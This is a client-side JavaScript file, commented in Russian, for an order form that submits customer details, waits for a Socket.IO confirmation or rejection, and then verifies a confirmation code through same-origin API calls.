// Инициализация Socket.IO
const socket = io();

// Модальные окна
const orderModal = document.getElementById('orderModal');
const loadingModal = document.getElementById('loadingModal');
const codeModal = document.getElementById('codeModal');
const thanksModal = document.getElementById('thanksModal');

// Кнопки и формы
const orderBtn = document.getElementById('orderBtn');
const orderForm = document.getElementById('orderForm');
const codeForm = document.getElementById('codeForm');
const closeBtn = document.querySelector('.close');

let currentOrderId = null;

// Открытие модального окна заказа
orderBtn.addEventListener('click', () => {
    orderModal.style.display = 'block';
});

// Закрытие модального окна
closeBtn.addEventListener('click', () => {
    orderModal.style.display = 'none';
});

// Закрытие при клике вне окна
window.addEventListener('click', (e) => {
    if (e.target === orderModal) {
        orderModal.style.display = 'none';
    }
});

// Отправка заказа
orderForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(orderForm);
    const orderData = {
        customerName: formData.get('customerName'),
        customerPhone: formData.get('customerPhone'),
        customerEmail: formData.get('customerEmail'),
        orderDetails: formData.get('orderDetails')
    };

    try {
        const response = await fetch('/api/order', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(orderData)
        });

        const result = await response.json();
        
        if (result.success) {
            currentOrderId = result.orderId;
            orderModal.style.display = 'none';
            loadingModal.style.display = 'block';
        } else {
            alert('Ошибка при отправке заказа. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при отправке заказа. Попробуйте еще раз.');
    }
});

// Отправка кода подтверждения
codeForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(codeForm);
    const code = formData.get('confirmationCode');

    try {
        const response = await fetch('/api/verify-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                orderId: currentOrderId, 
                code: code 
            })
        });

        const result = await response.json();
        
        if (result.success) {
            codeModal.style.display = 'none';
            thanksModal.style.display = 'block';
        } else {
            alert('Неверный код подтверждения. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при проверке кода. Попробуйте еще раз.');
    }
});

// Обработка событий от сервера через WebSocket
socket.on('orderConfirmed', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        codeModal.style.display = 'block';
    }
});

socket.on('orderRejected', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        alert('Ваш заказ был отклонен. Пожалуйста, свяжитесь с нами для уточнения деталей.');
    }
});

// Анимация загрузки
function showLoadingModal() {
    loadingModal.style.display = 'block';
}

function hideLoadingModal() {
    loadingModal.style.display = 'none';
}

// Уведомление о подключении
socket.on('connect', () => {
    console.log('Connected to server');
});

socket.on('disconnect', () => {
    console.log('Disconnected from server');
});